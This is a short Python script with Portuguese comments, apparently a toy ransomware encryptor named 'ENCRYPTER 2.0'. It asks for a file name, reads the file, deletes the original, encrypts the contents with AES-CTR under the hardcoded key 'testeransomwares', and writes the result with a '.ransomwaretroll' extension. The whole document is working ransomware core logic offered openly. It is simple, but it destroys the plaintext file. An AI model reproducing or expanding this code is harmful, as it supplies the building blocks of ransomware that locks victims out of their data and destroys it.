import os
import pyaes

def encrypter_file(file_name, key):
    # Abrir o arquivo para criptografia
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Criar um objeto AES com a chave
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)

    print(f"Arquivo criptografado salvo como: {new_file_name}")

if __name__ == "__main__":
    print('''
    ==============================================================
    ||								||
    ||			  ENCRYPTER 2.0				||
    ||								||
    ==============================================================
    
    ''')
    
    # Solicitar o nome do arquivo para criptografia
    file_name = input("Digite o nome do arquivo: ")
    
    # Solicitar a chave para criptografia
    key = b"testeransomwares"

    # Chamar a função para criptografar o arquivo
    encrypter_file(file_name, key)
